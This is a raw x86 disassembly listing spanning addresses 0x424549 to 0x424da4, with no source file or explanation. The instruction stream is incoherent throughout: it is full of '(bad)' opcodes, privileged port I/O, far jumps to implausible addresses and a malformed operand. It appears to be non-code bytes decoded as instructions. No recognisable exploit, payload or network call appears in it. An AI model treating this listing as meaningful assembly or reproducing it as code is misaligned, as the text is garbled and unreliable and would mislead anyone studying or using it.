  424549:	scas   al,BYTE PTR es:[edi]
  42454a:	(bad)  
  42454b:	mov    eax,0x67ea00de
  424550:	xor    eax,edx
  424552:	loopne 0x4245b5
  424554:	mov    dl,0x30
  424556:	adc    DWORD PTR [edi+0x32f124b4],0xfa0d48b
  424560:	push   ebx
  424561:	psrad  mm5,QWORD PTR [esi+0x49]
  424565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424566:	data16 sbb ah,dh
  424569:	je     0x424551
  42456b:	aam    0x7c
  42456d:	cmp    BYTE PTR [ebx+0x6f265e76],cl
  424573:	inc    edx
  424574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424575:	lahf   
  424576:	mov    ch,0x3d
  424578:	outs   dx,BYTE PTR ds:[esi]
  424579:	imul   esp,DWORD PTR [eax+esi*2+0x23],0x4d3027ba
  424581:	retf   0x1ee
  424584:	jo     0x424512
  424586:	jbe    0x4245a1
  424588:	je     0x42458a
  42458a:	inc    esp
  42458b:	ss out dx,eax
  42458d:	push   ss
  42458e:	jmp    0xc0c985b6
  424593:	and    edi,DWORD PTR [ebx+0x25]
  424596:	in     al,0xeb
  424598:	dec    ebx
  424599:	add    ecx,esp
  42459b:	sbb    DWORD PTR [edi],ebx
  42459d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42459e:	(bad)  
  42459f:	cmp    BYTE PTR [ebp-0x38],ah
  4245a2:	mov    WORD PTR [edi-0xb],gs
  4245a5:	pop    esp
  4245a6:	or     al,0x56
  4245a8:	add    ebp,DWORD PTR [edx]
  4245aa:	test   dh,0xae
  4245ad:	in     eax,0x11
  4245af:	xor    bh,BYTE PTR [eax]
  4245b1:	inc    DWORD PTR [esi+0x19eb1d4f]
  4245b7:	xor    BYTE PTR [esi],cl
  4245b9:	jmp    0x37e5821f
  4245be:	ret    0xb474
  4245c1:	cmp    eax,0x30032e42
  4245c6:	jae    0x4245fe
  4245c8:	sbb    al,0xb1
  4245ca:	cmp    eax,0x9f7ea12b
  4245cf:	mov    ch,0x0
  4245d1:	stos   DWORD PTR es:[edi],eax
  4245d2:	and    BYTE PTR [ecx-0x4b],0xe9
  4245d6:	mov    BYTE PTR [eax+0x406630f6],cl
  4245dc:	mov    cl,0x50
  4245de:	rcl    BYTE PTR [edi+0x609b10c9],0x5
  4245e5:	icebp  
  4245e6:	jg     0x4245bb
  4245e8:	in     al,0x3
  4245ea:	inc    edi
  4245eb:	mov    ch,0xdb
  4245ed:	shl    DWORD PTR [edi+0x29],0xd1
  4245f1:	outs   dx,BYTE PTR ds:[esi]
  4245f2:	cmp    eax,0xcc483815
  4245f7:	jge    0x4245c6
  4245f9:	add    DWORD PTR [edx],ebp
  4245fb:	xchg   ecx,eax
  4245fc:	add    al,0x84
  4245fe:	or     al,0x31
  424600:	xchg   ecx,eax
  424601:	or     DWORD PTR [eax+0x1b79eb25],edi
  424607:	jmp    0x6a154255
  42460c:	scas   al,BYTE PTR es:[edi]
  42460d:	and    edi,DWORD PTR [ebx]
  42460f:	fdivr  QWORD PTR [ebp+edi*1+0x15]
  424613:	add    al,0xd7
  424615:	jg     0x424654
  424617:	lea    edi,ds:0x63790471
  42461d:	inc    ebp
  42461e:	or     al,BYTE PTR [edi]
  424620:	mov    WORD PTR [edx+0x37a50582],gs
  424626:	sub    BYTE PTR [esi],cl
  424628:	mov    esp,0xeb1248c9
  42462d:	inc    ecx
  42462e:	stos   DWORD PTR es:[edi],eax
  42462f:	nop
  424630:	adc    eax,0xef921928
  424635:	jno    0x791615da
  42463b:	xchg   ecx,eax
  42463c:	lods   al,BYTE PTR ds:[esi]
  42463d:	sbb    al,0x5
  42463f:	cli    
  424640:	sbb    edx,edx
  424642:	test   eax,0x489e0567
  424647:	in     al,dx
  424648:	fisttp DWORD PTR [eax+ebx*4]
  42464b:	mov    dh,BYTE PTR [ebp-0x39]
  42464e:	adc    BYTE PTR [esi],ch
  424650:	das    
  424651:	arpl   WORD PTR [ecx],sp
  424653:	lods   eax,DWORD PTR ds:[esi]
  424654:	add    edi,DWORD PTR [edx-0x5bd4095]
  42465a:	out    dx,eax
  42465b:	mov    edi,0x975b3bda
  424660:	dec    ebx
  424661:	mov    cl,bl
  424663:	push   eax
  424664:	dec    edx
  424665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424666:	mov    esi,0x30bcf5d4
  42466b:	test   ecx,eax
  42466d:	into   
  42466e:	mov    ecx,0x46c5d060
  424673:	and    dl,BYTE PTR [esp+ebx*8]
  424676:	hlt    
  424677:	frstor [edx+0x251a0310]
  42467d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42467e:	sbb    DWORD PTR [ebx],eax
  424680:	or     eax,0x7f510319
  424685:	ret    
  424686:	cmp    BYTE PTR [ebx],bl
  424688:	andnps xmm0,XMMWORD PTR [eax-0x63]
  42468c:	sbb    BYTE PTR [edi-0x21],al
  42468f:	push   ecx
  424690:	add    al,0x27
  424692:	push   edx
  424693:	sbb    DWORD PTR [ebp-0x40800100],edi
  424699:	in     eax,0xef
  42469b:	cmp    BYTE PTR [edi],ch
  42469d:	and    esp,DWORD PTR [edi]
  42469f:	adc    eax,0x6baa6e9e
  4246a4:	inc    ebp
  4246a5:	and    dl,al
  4246a7:	mov    ch,0x72
  4246a9:	(bad)  
  4246aa:	fnstcw WORD PTR [ebx-0x4a7720d2]
  4246b0:	xlat   BYTE PTR ds:[ebx]
  4246b1:	mov    dl,0x64
  4246b3:	mov    WORD PTR [ebx+edi*1],cs
  4246b6:	imul   eax,DWORD PTR gs:[ecx+0x2c],0x45
  4246bb:	xchg   ebp,eax
  4246bc:	pop    eax
  4246bd:	add    al,0xfe
  4246bf:	xchg   ecx,eax
  4246c0:	mov    eax,0x8e8a76ba
  4246c5:	sbb    BYTE PTR [ebp+ebp*4+0x62327883],ch
  4246cc:	jl     0x424727
  4246ce:	call   0x7dec:0x8b4a318
  4246d5:	arpl   dx,dx
  4246d7:	mov    dh,0x29
  4246d9:	js     0x4246ed
  4246db:	out    dx,eax
  4246dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246dd:	pop    es
  4246de:	in     eax,0x87
  4246e0:	dec    ebx
  4246e1:	call   0x628d:0xc360b3aa
  4246e8:	xor    eax,0x2b807ca3
  4246ed:	pop    esp
  4246ee:	aad    0x79
  4246f0:	not    DWORD PTR [ecx]
  4246f2:	sar    DWORD PTR [eax+0x7010e9a9],0xd7
  4246f9:	mov    ds:0xcb945837,eax
  4246fe:	xchg   DWORD PTR [ecx+0x44b52955],ebx
  424704:	fstp   st(2)
  424706:	out    0x60,al
  424708:	pushf  
  424709:	cmp    BYTE PTR [esi-0x48593059],0x48
  424710:	jmp    0xd37ed6fe
  424715:	dec    edi
  424716:	sub    esp,ecx
  424718:	cmc    
  424719:	pop    eax
  42471a:	iret   
  42471b:	pop    edx
  42471c:	call   0x12c170c7
  424721:	jecxz  0x4246e1
  424723:	test   eax,0xcea2ddfa
  424728:	mov    dh,0xa6
  42472a:	pop    ebx
  42472b:	in     eax,dx
  42472c:	xchg   edx,eax
  42472d:	aas    
  42472e:	sub    al,0xda
  424730:	adc    eax,0x498420cc
  424735:	cs mov esp,esi
  424738:	inc    edx
  424739:	mov    ds,ebp
  42473b:	out    0x1b,al
  42473d:	sbb    esp,ebp
  42473f:	add    al,0x44
  424741:	mov    cl,BYTE PTR [edx+0x2828a5eb]
  424747:	xor    al,0x1e
  424749:	sahf   
  42474a:	jno    0x4246da
  42474c:	std    
  42474d:	(bad)  
  42474e:	adc    al,0x73
  424750:	inc    eax
  424751:	pop    ss
  424752:	and    DWORD PTR [eax+ebp*1],ecx
  424755:	jecxz  0x42470f
  424757:	(bad)  
  424758:	mov    ds:0x81634db9,al
  42475d:	ss xchg edx,eax
  42475f:	pop    eax
  424760:	fisubr DWORD PTR [ebx+0x41]
  424763:	loopne 0x4246f0
  424765:	popf   
  424766:	or     al,0x3d
  424768:	ja     0x42474b
  42476a:	call   0xfccbffa7
  42476f:	sub    cl,BYTE PTR [edx+0x1b]
  424772:	lds    edx,FWORD PTR [ebx+0x2a]
  424775:	jnp    0x424793
  424777:	loope  0x42471d
  424779:	mov    cs,WORD PTR ds:0x8c328275
  42477f:	mov    edx,0x6d55a856
  424784:	fnstenv [eax+0x6a]
  424787:	and    bl,bh
  424789:	imul   esp,DWORD PTR [ecx-0x9],0xffffff8a
  42478d:	scas   eax,DWORD PTR es:[edi]
  42478e:	or     al,BYTE PTR [edx]
  424790:	fs jg  0x424725
  424793:	mov    ebx,0x7eb6c945
  424798:	push   ss
  424799:	inc    esi
  42479a:	adc    al,0x44
  42479c:	fdiv   QWORD PTR [edx]
  42479e:	ins    DWORD PTR es:[edi],dx
  42479f:	test   al,0xf4
  4247a1:	and    edx,DWORD PTR [edx-0x14bcfa51]
  4247a7:	lods   al,BYTE PTR ds:[esi]
  4247a8:	jo     0x42481d
  4247aa:	out    dx,al
  4247ab:	sub    al,BYTE PTR [eax-0x61ca8642]
  4247b1:	icebp  
  4247b2:	pop    ds
  4247b3:	cmp    eax,0x1de1db11
  4247b8:	stc    
  4247b9:	sub    BYTE PTR [edi],ch
  4247bb:	sub    esi,eax
  4247bd:	push   ebx
  4247be:	out    dx,eax
  4247bf:	push   ds
  4247c0:	sbb    DWORD PTR [ebp-0x6b9aa1a4],0x5c
  4247c7:	test   DWORD PTR [edx],edi
  4247c9:	jg     0x4247d3
  4247cb:	inc    esi
  4247cc:	ja     0x42484d
  4247ce:	push   ss
  4247cf:	xchg   ebx,eax
  4247d0:	mov    BYTE PTR [edx-0x3e],cl
  4247d3:	ja     0x42480d
  4247d5:	jnp    0x4247ea
  4247d7:	out    0x89,al
  4247d9:	das    
  4247da:	mov    esi,0x97ee7d9e
  4247df:	mov    cs,ebx
  4247e1:	in     eax,dx
  4247e2:	mov    esp,0xbbccf729
  4247e7:	jb     0x4247bb
  4247e9:	leave  
  4247ea:	mov    bh,cl
  4247ec:	mov    ah,0x30
  4247ee:	nop
  4247ef:	adc    eax,esp
  4247f1:	xor    eax,0x60816d22
  4247f6:	dec    eax
  4247f7:	rol    ah,cl
  4247f9:	inc    eax
  4247fa:	loop   0x4247a2
  4247fc:	dec    BYTE PTR [eax-0x2d]
  4247ff:	jno    0x42479b
  424801:	fld    TBYTE PTR [eax-0x32]
  424804:	retf   0xf5ff
  424807:	fisttp QWORD PTR [esi+ebp*4+0x2]
  42480b:	std    
  42480c:	rcr    DWORD PTR [edx],0x5a
  42480f:	push   edx
  424810:	sar    BYTE PTR [edx+0x76],cl
  424813:	das    
  424814:	push   ecx
  424815:	xchg   esi,eax
  424816:	add    DWORD PTR [ecx],ebp
  424818:	into   
  424819:	inc    ecx
  42481a:	data16 out dx,al
  42481c:	test   al,0xa2
  42481e:	pop    edx
  42481f:	pop    edx
  424820:	gs jns 0x424804
  424823:	les    ebx,FWORD PTR [esi-0x1008f7e4]
  424829:	cmp    eax,0xcb64b5f2
  42482e:	sbb    BYTE PTR [edi-0x31],dl
  424831:	mov    eax,0x40fdd706
  424836:	fcom   DWORD PTR es:[edi+ecx*2+0x56]
  42483b:	cmp    eax,0xd3587525
  424840:	jp     0x4247f9
  424842:	(bad)
  424845:	cmp    ebp,ebp
  424847:	mov    ch,0x82
  424849:	mov    ds:0x36e2f974,eax
  42484e:	fistp  QWORD PTR [ecx]
  424850:	shl    al,1
  424852:	lock jge 0x4247fc
  424855:	pusha  
  424856:	shl    DWORD PTR [esi-0x10],0x6
  42485a:	pop    esp
  42485b:	jae    0x424805
  42485d:	mov    bh,0x59
  42485f:	mov    edi,0x494c9b53
  424864:	sbb    DWORD PTR [esi+edi*4],0x2f
  424868:	arpl   WORD PTR [ebp+0x1437098],dx
  42486e:	or     dl,BYTE PTR [ecx-0x20b33c5a]
  424874:	idiv   DWORD PTR [ebp+0xb]
  424877:	outs   dx,DWORD PTR ds:[esi]
  424878:	xchg   esp,eax
  424879:	pop    esp
  42487a:	sbb    BYTE PTR [ebx-0x6d],dh
  42487d:	(bad)  
  42487e:	adc    dl,BYTE PTR [ebp-0x41]
  424881:	loop   0x42481f
  424883:	inc    ecx
  424884:	jg     0x4248a5
  424886:	stos   BYTE PTR es:[edi],al
  424887:	stos   DWORD PTR es:[edi],eax
  424888:	sbb    DWORD PTR [ecx],esi
  42488a:	mov    dl,0x6b
  42488c:	xor    edx,esp
  42488e:	shl    BYTE PTR [ebx],0x9d
  424891:	popf   
  424892:	aad    0xee
  424894:	(bad)  
  424895:	cmp    edx,ebx
  424897:	adc    al,0x35
  424899:	call   0x209d:0x7f3b0095
  4248a0:	push   ss
  4248a1:	and    BYTE PTR [ebx+ecx*8-0x3f],0xb7
  4248a6:	scas   eax,DWORD PTR es:[edi]
  4248a7:	sahf   
  4248a8:	aad    0xe7
  4248aa:	lahf   
  4248ab:	xor    BYTE PTR [edi],0x28
  4248ae:	(bad)  
  4248af:	sar    ecx,1
  4248b1:	mov    WORD PTR [eax+0x7ef69623],es
  4248b7:	add    DWORD PTR [ecx-0x6c6dfbe3],esi
  4248bd:	icebp  
  4248be:	clc    
  4248bf:	jb     0x4248a3
  4248c1:	mov    al,0x74
  4248c3:	and    al,0xfe
  4248c5:	repz and DWORD PTR [esi],ebp
  4248c8:	and    bh,bl
  4248ca:	adc    ecx,esp
  4248cc:	loop   0x4248a3
  4248ce:	xchg   dh,bl
  4248d0:	lock push esp
  4248d2:	daa    
  4248d3:	push   ecx
  4248d4:	add    ch,0xd2
  4248d7:	xor    al,0x93
  4248d9:	add    al,0xd8
  4248db:	fwait
  4248dc:	inc    esi
  4248dd:	cmp    dh,BYTE PTR [edi]
  4248df:	idiv   BYTE PTR [ecx-0x5c]
  4248e2:	push   0x51
  4248e4:	and    ecx,DWORD PTR [edi+edi*2+0x54cf96c]
  4248eb:	jae    0x424964
  4248ed:	imul   DWORD PTR [ecx-0x7e01e3ee]
  4248f3:	pop    eax
  4248f4:	sbb    ah,BYTE PTR [ebx+0x77ca2b52]
  4248fa:	xor    BYTE PTR ds:0x9b2662cd,al
  424900:	xchg   esi,eax
  424901:	sub    DWORD PTR [ebx+edx*4+0x1c],esp
  424905:	push   sp
  424907:	push   edx
  424908:	xchg   esp,eax
  424909:	dec    ebp
  42490a:	int3   
  42490b:	mov    dl,0x3b
  42490d:	cmp    eax,0x1628f0e5
  424912:	jl     0x42489d
  424914:	dec    eax
  424915:	dec    edx
  424916:	fild   QWORD PTR [esp+esi*4+0x3a]
  42491a:	jbe    0x4248b1
  42491c:	inc    ecx
  42491d:	outs   dx,BYTE PTR ds:[esi]
  42491e:	jge    0x42490a
  424920:	out    dx,eax
  424921:	cmp    BYTE PTR [eax],dl
  424923:	cmp    al,0xb6
  424925:	adc    bh,cl
  424927:	pushf  
  424928:	std    
  424929:	out    dx,al
  42492a:	gs dec ecx
  42492c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42492d:	test   BYTE PTR [edx+0x67d90529],bh
  424933:	leave  
  424934:	mov    dh,0x95
  424936:	add    al,BYTE PTR [esi+0x1d93d46]
  42493c:	mov    ch,0x29
  42493e:	(bad)  
  42493f:	mov    eax,0x88f9588e
  424944:	pop    esi
  424945:	jmp    0x4249bf
  424947:	jmp    0xd70e8d34
  42494c:	sbb    cl,BYTE PTR [ecx]
  42494e:	iret   
  42494f:	ret    
  424950:	mov    bh,0x7c
  424952:	ds iret 
  424954:	jg     0x424960
  424956:	(bad)  
  424958:	sar    DWORD PTR [esp+eax*4-0x20],1
  42495c:	mov    al,ds:0x83c092c3
  424961:	imul   edi,DWORD PTR [eax-0x64691c43],0x36
  424968:	or     BYTE PTR [edi-0x1af8aa39],ch
  42496e:	inc    esp
  42496f:	(bad)  
  424970:	sbb    eax,0x5407d6ec
  424975:	es stos BYTE PTR es:[edi],al
  424977:	mov    esp,0xed7bc869
  42497c:	shr    BYTE PTR [ebx],1
  42497e:	mov    eax,ds:0x7e51a719
  424983:	mov    esi,0xd342b5d5
  424988:	xchg   ebp,eax
  424989:	gs sahf 
  42498b:	call   0x2ec:0x76928206
  424992:	xchg   eax,ecx
  424994:	aam    0x94
  424996:	push   0x72cf7149
  42499b:	fistp  WORD PTR [ecx-0x359ca2fe]
  4249a1:	push   ebx
  4249a2:	inc    eax
  4249a3:	and    ebx,DWORD PTR [edi-0x76]
  4249a6:	dec    esp
  4249a7:	mov    ebp,0xa9270a74
  4249ac:	adc    al,0x1f
  4249ae:	cmp    eax,0xf14c4f6d
  4249b3:	call   0x63ed4834
  4249b8:	sbb    eax,0xa5eb571b
  4249bd:	push   edi
  4249be:	inc    esp
  4249bf:	add    al,0xc7
  4249c1:	mov    cl,0x79
  4249c3:	repz out dx,al
  4249c5:	popa   
  4249c6:	mov    WORD PTR ds:0xf786fc57,ds
  4249cc:	adc    eax,0x795bc874
  4249d1:	cs inc ebp
  4249d3:	stos   BYTE PTR es:[edi],al
  4249d4:	xchg   esp,eax
  4249d5:	int3   
  4249d6:	cmp    eax,0x4ea59318
  4249db:	scas   al,BYTE PTR es:[edi]
  4249dc:	sub    eax,0x8d5633b3
  4249e1:	pop    ecx
  4249e2:	push   edx
  4249e3:	dec    esi
  4249e4:	fwait
  4249e5:	xchg   BYTE PTR [ebx-0x1d26328c],ch
  4249eb:	adc    eax,0xe7994f78
  4249f0:	mov    BYTE PTR [esi],cl
  4249f2:	test   DWORD PTR [edi+ebp*4-0x3e1258d5],ebx
  4249f9:	leave  
  4249fa:	stos   DWORD PTR es:[edi],eax
  4249fb:	pop    es
  4249fc:	cmp    ah,BYTE PTR [ebx]
  4249fe:	mov    ss,WORD PTR [esi-0x482c9c70]
  424a04:	xchg   esi,eax
  424a05:	add    dl,BYTE PTR [edi+0x2f]
  424a08:	aaa    
  424a09:	xchg   DWORD PTR [ebx-0x5e],esp
  424a0c:	pop    ecx
  424a0d:	repnz lods eax,DWORD PTR ds:[esi]
  424a0f:	xchg   edi,eax
  424a10:	mov    DWORD PTR [esi-0x2f],ebp
  424a13:	cmp    edx,edx
  424a15:	fisttp QWORD PTR [edi-0x47]
  424a18:	call   0x2b2d863c
  424a1d:	jbe    0x4249f8
  424a1f:	ja     0x424a62
  424a21:	inc    edx
  424a22:	fdivp  st(1),st
  424a24:	imul   ecx,DWORD PTR [edi+0x74],0xe829bd66
  424a2b:	aad    0x12
  424a2d:	xchg   edi,eax
  424a2e:	dec    edi
  424a2f:	js     0x424a2a
  424a31:	sub    ecx,DWORD PTR [esi]
  424a33:	push   ds
  424a34:	xchg   BYTE PTR [edi+0x31],dl
  424a37:	sbb    eax,ebx
  424a39:	not    DWORD PTR [ecx]
  424a3b:	mov    ah,BYTE PTR [esi+0x3a]
  424a3e:	mul    DWORD PTR [ecx]
  424a40:	shr    BYTE PTR [eax+0x48ace08c],cl
  424a46:	(bad)  [edi+0x14]
  424a49:	outs   dx,BYTE PTR ds:[esi]
  424a4a:	aad    0x53
  424a4c:	pop    edi
  424a4d:	xchg   BYTE PTR [ebp+0x54],bh
  424a50:	adc    esp,esi
  424a52:	cdq    
  424a53:	enter  0xb7df,0x1d
  424a57:	xchg   edi,eax
  424a58:	std    
  424a59:	and    DWORD PTR [esi+0x50f4ab9b],0xb087c64d
  424a63:	add    DWORD PTR [eax-0xf3a2f45],ecx
  424a69:	jmp    0xf454:0x556ce942
  424a70:	push   ecx
  424a71:	xlat   BYTE PTR ds:[ebx]
  424a72:	test   eax,0x2e58d635
  424a77:	popf   
  424a78:	mov    edx,0xeabd6e54
  424a7d:	arpl   WORD PTR [eax],sp
  424a7f:	or     ecx,ebp
  424a81:	in     eax,dx
  424a82:	push   ss
  424a83:	cmp    DWORD PTR [eax-0x63a27906],0xffffffef
  424a8a:	adc    al,0x54
  424a8c:	rcl    BYTE PTR [ebp-0x74],0xfb
  424a90:	mov    edi,0x7903b593
  424a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a96:	mov    ch,0xed
  424a98:	adc    esi,0xe5764c41
  424a9e:	xchg   DWORD PTR [edx+0x77],esp
  424aa1:	repnz fmul st(0),st
  424aa4:	sbb    BYTE PTR [ebx-0x4a10a149],0x1b
  424aab:	sbb    cl,BYTE PTR [edi-0x37]
  424aae:	sbb    eax,0x94c9930
  424ab3:	imul   edx,DWORD PTR [esi+ebx*2+0x6e],0xfffffff6
  424ab8:	mov    eax,0x8ad8fe0d
  424abd:	hlt    
  424abe:	add    ebx,ebx
  424ac0:	(bad)  
  424ac1:	std    
  424ac2:	dec    ebx
  424ac3:	sbb    eax,0x18f8d40
  424ac8:	sub    dl,bl
  424aca:	pop    ebp
  424acb:	ret    0x3e46
  424ace:	stc    
  424acf:	pop    eax
  424ad0:	adc    BYTE PTR [eax+ebx*1+0x21cc3144],ah
  424ad7:	inc    edi
  424ad8:	add    bh,BYTE PTR [esi]
  424ada:	xor    DWORD PTR [esi],esi
  424adc:	cmp    ecx,DWORD PTR [ebx]
  424ade:	test   al,0x7
  424ae0:	push   ds
  424ae1:	es ret 0xad94
  424ae5:	and    DWORD PTR [ebx+0x3451e4e9],edx
  424aeb:	into   
  424aec:	mov    es,WORD PTR [edi+0x60157332]
  424af2:	pushf  
  424af3:	fild   QWORD PTR ds:0xd8762b6e
  424af9:	jns    0x424ab8
  424afb:	sahf   
  424afc:	sub    DWORD PTR ds:0xaf9a5f60,ecx
  424b02:	ja     0x424b4b
  424b04:	ds pop esp
  424b06:	enter  0xba1d,0x6b
  424b0a:	or     BYTE PTR [edi-0x48],dl
  424b0d:	lods   al,BYTE PTR ds:[esi]
  424b0e:	mov    edx,DWORD PTR [edx+esi*2]
  424b11:	(bad)  [ebx-0x67]
  424b14:	bound  esi,QWORD PTR [ecx]
  424b16:	sub    al,0xe5
  424b18:	or     eax,0x8aea4817
  424b1d:	test   DWORD PTR [edi],esi
  424b1f:	adc    BYTE PTR [ebx],dh
  424b21:	mov    esp,0xd9f12e37
  424b26:	mov    bl,0xe
  424b28:	sbb    DWORD PTR [eax],edx
  424b2a:	cmp    dh,BYTE PTR [edi+0x3ad52b2b]
  424b30:	shl    ebx,0xd7
  424b33:	ds inc edi
  424b35:	push   ds
  424b36:	lds    edx,FWORD PTR [esi]
  424b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b39:	dec    esi
  424b3a:	xchg   DWORD PTR [esi+ebp*4],edx
  424b3d:	cmp    DWORD PTR [edi+esi*8-0x5c],esi
  424b41:	popa   
  424b42:	out    0xae,eax
  424b44:	pushfw 
  424b46:	mov    cl,0x33
  424b48:	fcmove st,st(5)
  424b4a:	in     eax,dx
  424b4b:	imul   ecx,DWORD PTR [edi+0x1f7cfd06],0x66b60e4b
  424b55:	and    al,0x6a
  424b57:	mov    ch,0xc2
  424b59:	push   cs
  424b5a:	cmp    al,0xf6
  424b5c:	cwde   
  424b5d:	inc    esi
  424b5e:	iret   
  424b5f:	out    0x3,eax
  424b61:	sbb    al,0xe3
  424b63:	sub    DWORD PTR [ebx+0x65],0xee6fdaa2
  424b6a:	popa   
  424b6b:	dec    esi
  424b6c:	xor    dh,dh
  424b6e:	dec    ebx
  424b6f:	fidiv  DWORD PTR [eax+0x3c1f5bdd]
  424b75:	dec    ebp
  424b76:	adc    al,0x7d
  424b78:	dec    ebx
  424b79:	xchg   ebp,eax
  424b7a:	test   BYTE PTR [eax],al
  424b7c:	xchg   ebp,eax
  424b7d:	in     eax,0x5a
  424b7f:	leave  
  424b80:	or     eax,edx
  424b82:	fs imul edi,edi,0x2c
  424b86:	mov    al,bh
  424b88:	dec    ebp
  424b89:	push   es
  424b8a:	push   ebx
  424b8b:	adc    eax,0x5cbeb3c8
  424b90:	mov    ds:0x350806a,eax
  424b95:	(bad)  
  424b96:	jmp    0x440b:0x777a6f22
  424b9d:	push   ecx
  424b9f:	jmp    0xed35cb33
  424ba4:	lahf   
  424ba5:	jmp    0xb333528
  424baa:	daa    
  424bab:	jb     0x424b7f
  424bad:	pop    ebp
  424bae:	stc    
  424baf:	or     ebx,esi
  424bb1:	pusha  
  424bb2:	mov    ds:0xb861a16b,eax
  424bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bb8:	push   esi
  424bb9:	shl    DWORD PTR [ecx-0x1f],1
  424bbc:	jns    0x424c16
  424bbe:	stc    
  424bbf:	jno    0x424b7e
  424bc1:	ror    esi,1
  424bc3:	test   DWORD PTR [ecx+0x5e],ebx
  424bc6:	and    DWORD PTR [edx-0x501c0f0f],esi
  424bcc:	xor    eax,0xe8660b40
  424bd1:	push   0x41
  424bd3:	test   eax,0x2e6ea2d0
  424bd8:	fild   WORD PTR ds:0x52569ac1
  424bde:	fistp  WORD PTR [eax+0x30e05971]
  424be4:	xchg   ecx,eax
  424be5:	push   ss
  424be6:	pop    ebp
  424be7:	sti    
  424be8:	int3   
  424be9:	xchg   ebp,eax
  424bea:	or     eax,0xb247e7f6
  424bef:	or     eax,0x850ca8d2
  424bf4:	jb     0x55192172
  424bfa:	push   0x6d093eab
  424bff:	loope  0x424bd9
  424c01:	scas   al,BYTE PTR es:[edi]
  424c02:	daa    
  424c03:	jnp    0x424b88
  424c05:	pop    ecx
  424c06:	dec    ebx
  424c07:	mov    bh,0x70
  424c09:	mov    edi,DWORD PTR [eax-0x77dd3467]
  424c0f:	es inc edx
  424c11:	dec    ebx
  424c12:	and    DWORD PTR [eax-0x7e],ebp
  424c15:	fxch   st(2)
  424c17:	xchg   bh,dh
  424c19:	dec    esp
  424c1a:	mov    ds:0x45868620,al
  424c1f:	fs stos DWORD PTR es:[edi],eax
  424c21:	sbb    eax,0xcbc168d8
  424c26:	ds out dx,al
  424c28:	jge    0x424c17
  424c2a:	sub    eax,0xc084a679
  424c2f:	xchg   ebx,eax
  424c30:	or     DWORD PTR [ebp-0x52fc213b],ecx
  424c36:	xchg   edx,eax
  424c37:	mov    ?,WORD PTR [ecx]
  424c39:	psubd  mm1,mm5
  424c3c:	daa    
  424c3d:	(bad)  
  424c3e:	(bad)  
  424c40:	pop    ebp
  424c41:	lods   eax,DWORD PTR ds:[esi]
  424c42:	pop    esp
  424c43:	pushf  
  424c44:	adc    ebp,DWORD PTR [edi]
  424c46:	mov    eax,ds:0x151ec769
  424c4b:	stc    
  424c4c:	lds    ebp,FWORD PTR [ecx-0x6bad8326]
  424c52:	test   BYTE PTR [ecx],0x6d
  424c55:	push   esi
  424c56:	sahf   
  424c57:	add    al,0x1e
  424c59:	sbb    eax,0x3142a2a6
  424c5e:	cmp    eax,DWORD PTR [bp+0x37]
  424c62:	jecxz  0x424ce3
  424c64:	jmp    0xdb50:0x2bee6165
  424c6b:	xchg   BYTE PTR [edx],ch
  424c6d:	xchg   esi,eax
  424c6e:	out    dx,al
  424c6f:	jb     0x424cee
  424c71:	(bad)  
  424c72:	xor    al,0x18
  424c74:	sbb    DWORD PTR [ebx-0x134c34bf],edi
  424c7a:	add    ecx,ecx
  424c7c:	int    0x7d
  424c7e:	outs   dx,BYTE PTR ds:[esi]
  424c7f:	call   0xea8:0x6699e5b4
  424c86:	inc    ecx
  424c87:	das    
  424c88:	add    al,0x3
  424c8a:	fs pop ecx
  424c8c:	ins    DWORD PTR es:[edi],dx
  424c8d:	adc    al,0xb
  424c8f:	cmp    BYTE PTR [edi+0x21],bl
  424c92:	(bad)  
  424c93:	imul   esp,ebp,0x0
	...
  424d11:	add    BYTE PTR [eax],al
  424d13:	add    BYTE PTR [edi-0x1ab332f],ch
  424d19:	pop    ebp
  424d1a:	mov    edi,0x5e13fbfb
  424d1f:	cmp    DWORD PTR [edi-0x32],eax
  424d22:	pop    edi
  424d23:	scas   eax,DWORD PTR es:[edi]
  424d24:	or     al,0xe0
  424d26:	add    DWORD PTR [eax],eax
  424d28:	imul   eax,DWORD PTR [edi],0x464a0000
  424d2e:	pop    edi
  424d2f:	lods   eax,DWORD PTR gs:[esi]
  424d31:	out    dx,al
  424d32:	add    al,0xb3
  424d34:	mov    ebp,0x353a3dc0
  424d39:	js     0x424db5
  424d3b:	inc    esp
  424d3c:	addr16 loop 0x424ce3
  424d3f:	fisub  WORD PTR [edi]
  424d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d42:	add    eax,0xbc061d5a
  424d47:	retf   0x42b2
  424d4a:	(bad)  
  424d4b:	xor    edx,DWORD PTR [edi]
  424d4d:	mov    cl,0x91
  424d4f:	sahf   
  424d50:	mov    ebx,0xf9b7f586
  424d55:	jne    0x424db9
  424d57:	daa    
  424d58:	imul   ecx,DWORD PTR [edx],0xffffff9b
  424d5b:	push   ebx
  424d5c:	ins    BYTE PTR es:[edi],dx
  424d5d:	fnstsw WORD PTR [ebx]
  424d5f:	outs   dx,BYTE PTR ds:[esi]
  424d60:	mov    eax,ds:0x77333f9
  424d65:	mov    ds:0x71ea26a4,eax
  424d6a:	sti    
  424d6b:	fisttp WORD PTR [edx]
  424d6d:	aad    0xc3
  424d6f:	pop    esi
  424d70:	out    dx,al
  424d71:	retf   0xf6fe
  424d74:	xchg   ecx,eax
  424d75:	(bad)  
  424d77:	xchg   esp,eax
  424d78:	in     eax,0x77
  424d7a:	call   0x21106c18
  424d7f:	rcl    BYTE PTR ds:0x95301cf5,1
  424d85:	and    dl,0x8c
  424d88:	inc    eax
  424d89:	pop    eax
  424d8a:	jbe    0x424dde
  424d8c:	loop   0x424d1e
  424d8e:	cmc    
  424d8f:	cli    
  424d90:	out    0xc3,eax
  424d92:	or     BYTE PTR [edi],dl
  424d94:	inc    edi
  424d95:	jecxz  0x424d3d
  424d97:	arpl   WORD PTR [edx+0x6ae0593e],bp
  424d9d:	mov    ds:0x9189dd43,al
  424da2:	or     cl,dh
  424da4:	dec    esi
